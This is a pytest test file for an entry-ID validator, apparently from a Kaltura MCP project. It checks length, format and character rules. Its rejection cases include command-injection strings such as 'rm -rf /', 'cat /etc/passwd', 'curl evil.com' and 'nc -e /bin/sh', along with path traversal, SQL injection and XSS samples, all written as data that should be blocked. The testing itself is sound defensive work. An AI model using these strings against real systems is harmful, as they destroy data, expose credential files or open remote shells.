"""Test our input validation security logic."""

import pytest

from kaltura_mcp.tools import validate_entry_id


@pytest.mark.parametrize(
    "entry_id,expected",
    [
        # Our valid format
        ("123_abc123", True),
        ("999_test", True),
        ("1_a", True),
        ("12345_xyz789", True),
        # Our security blocks - invalid format
        ("invalid_format", False),  # Must start with number
        ("abc_123", False),  # Must start with number
        ("123", False),  # Must have underscore
        ("", False),  # Empty string
        ("123_", False),  # Empty after underscore
        ("_abc", False),  # No number before underscore
        # Our security blocks - dangerous characters
        ("123_$(rm -rf /)", False),  # Command injection
        ("123_`cat /etc/passwd`", False),  # Command injection
        ("123_; rm -rf /", False),  # Command injection
        ("123_&& echo 'pwned'", False),  # Command injection
        ("123_| cat /etc/hosts", False),  # Command injection
        ("123_../etc/passwd", False),  # Path traversal
        ("123_test/../config", False),  # Path traversal
        ("123_..\\windows", False),  # Path traversal
        # Our length validation
        ("1_" + "a" * 100, False),  # Too long (our limit is > 50)
        ("1_" + "a" * 48, True),  # Within our limit (1 + 1 + 48 = 50)
        ("1_" + "a" * 49, False),  # Too long (1 + 1 + 49 = 51, which is > 50)
        # Our format validation - only alphanumeric allowed
        ("123_abc-def", False),  # Hyphen not allowed
        ("123_abc.def", False),  # Dot not allowed
        ("123_abc@def", False),  # @ not allowed
        ("123_abc def", False),  # Space not allowed
        ("123_abc/def", False),  # Slash not allowed
        ("123_abc\\def", False),  # Backslash not allowed
        ("123_abc123", True),  # Only alphanumeric allowed
        ("123_ABC123", True),  # Uppercase allowed
    ],
)
def test_validate_entry_id_our_security_rules(entry_id, expected):
    """Test OUR entry ID validation and security rules."""
    assert validate_entry_id(entry_id) == expected


def test_validate_entry_id_type_safety():
    """Test our type checking logic."""
    # Our type validation should handle non-strings safely
    assert validate_entry_id(None) is False
    assert validate_entry_id(123) is False
    assert validate_entry_id([]) is False
    assert validate_entry_id({}) is False
    assert validate_entry_id(True) is False


@pytest.mark.parametrize(
    "malicious_input",
    [
        "123_$(rm -rf /)",
        "123_`whoami`",
        "123_; cat /etc/passwd",
        "123_&& curl evil.com",
        "123_| nc -e /bin/sh",
        "123_' OR '1'='1",
        "123_<script>alert('xss')</script>",
        '123_"; DROP TABLE users; --',
    ],
)
def test_validate_entry_id_blocks_malicious_input(malicious_input):
    """Test that our validation blocks known malicious patterns."""
    assert validate_entry_id(malicious_input) is False


def test_validate_entry_id_edge_cases():
    """Test edge cases for our validation."""
    # Test minimum valid case
    assert validate_entry_id("1_a") is True

    # Test at length limit
    valid_long = "1_" + "a" * 48  # Total length 50
    assert validate_entry_id(valid_long) is True

    # Test just over length limit
    too_long = "1_" + "a" * 49  # Total length 51, which exceeds our > 50 check
    assert validate_entry_id(too_long) is False
